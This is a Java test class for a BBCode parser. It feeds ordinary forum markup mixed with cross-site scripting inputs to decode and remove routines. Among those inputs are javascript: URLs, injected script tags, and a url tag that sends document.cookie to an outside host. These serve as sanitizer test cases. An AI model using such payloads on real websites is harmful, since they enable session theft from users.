/*
 * $RCSfile: BBCodeTest.java,v $$
 * $Revision: 1.1 $
 * $Date: 2013-3-19 $
 *
 * Copyright (C) 2008 WanMei, Inc. All rights reserved.
 *
 * This software is the proprietary information of WanMei, Inc.
 * Use is subject to license terms.
 */
package test.com.skin.ayada.util;

import java.util.Map;

import com.skin.ayada.util.BBCode;

/**
 * <p>Title: BBCodeTest</p>
 * <p>Description: </p>
 * <p>Copyright: Copyright (c) 2006</p>
 * @author chenyankui
 * @version 1.0
 */
public class BBCodeTest
{
    /**
     * @param args
     */
    public static void main(String[] args)
    {
        test1();
    }

    public static void evaluateTest()
    {
        String source = "<embd ${width=\"#1\"} ${height=\"#2\"}/>";
        String[] replacement = new String[]{"1", "2"};
        String result = BBCode.evaluate(source, replacement);
        System.out.println(result);
    }

    public static void replaceTest()
    {
        String source = "width=\"#1\"";
        String[] replacement = new String[]{"1", "2"};
        String result = BBCode.replace(source, replacement);
        System.out.println(result);
    }

    public static void test1()
    {
        StringBuilder source = new StringBuilder();
        source.append("[b]12[/b]\r\n");
        source.append("[img]http://www.test.com[/img]\r\n");
        source.append("[url=http://www.test.com][color=#ff0000][font=黑体][size=3]www.test.com[/size][/font][/color][/url]\r\n");
        source.append("[list=1][*]ab[*]ab[/list]\r\n");
        source.append("[color=orange]ab[/color]\r\n");
        source.append("[audio]http://www.test.com/audio.wma[/audio]\r\n");
        source.append("[attach]178427[/attach]\r\n");
        source.append("[attachimg]178427[/attachimg]\r\n");
        source.append("[flash=100,100]http://www.test.com/flash.swf[/flash]\r\n");
        source.append("[img]javascript:alert(document.cookie)[/img]\r\n");
        source.append("[color=\" <script>alert(1)</script><span]javascript:alert(document.cookie)[/color]\r\n");
        source.append("[url=javascript:eval(\"window.open(\\\"http://www.mytest.com?d=\\\"+encodeURIComponent(document.cookie))\")]www.test.com[/url]\r\n");
        source.append("<p><script>alert(1)</script></p>\r\n");
        source.append("[<script>alert(1)]test[</script>]\r\n");
        source.append("[script]alert(1);[/script]\r\n");
        source.append("[[[[[[[[[[[[[[[123\r\n");

        System.out.println("0         10        20        30        40        50        60        70        80        90        100       110       120       130       140       150       160       170");
        System.out.println("012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789");
        System.out.println(source);

        String result = BBCode.decode(source.toString());
        System.out.println(result);

        System.out.println("---------------------------------");
        result = BBCode.remove(source.toString());
        System.out.println(result);
    }

    /**
     * @param source
     * @return String
     */
    public static String quote(String source)
    {
        StringBuilder buffer = new StringBuilder();
        buffer.append("\"");

        if(source != null)
        {
            char c;

            for(int i = 0, size = source.length(); i < size; i++)
            {
                c = source.charAt(i);

                switch (c)
                {
                    case '\\':
                    {
                        buffer.append("\\\\"); break;
                    }
                    case '\'':
                    {
                        buffer.append("\\\'"); break;
                    }
                    case '"':
                    {
                        buffer.append("\\\""); break;
                    }
                    case '\r':
                    {
                        buffer.append("\\r"); break;
                    }
                    case '\n':
                    {
                        buffer.append("\\n"); break;
                    }
                    case '\t':
                    {
                        buffer.append("\\t"); break;
                    }
                    case '\b':
                    {
                        buffer.append("\\b"); break;
                    }
                    case '\f':
                    {
                        buffer.append("\\f"); break;
                    }
                    default :
                    {
                        buffer.append(c); break;
                    }
                }   
            }
        }

        buffer.append("\"");
        return buffer.toString();
    }

    public static void printMap()
    {
        Map<String, String> map = BBCode.map;

        for(Map.Entry<String, String> entry : map.entrySet())
        {
            System.out.println("map[\"" + entry.getKey() + "\"] = " + quote(entry.getValue()) + ";");
        }
    }
}
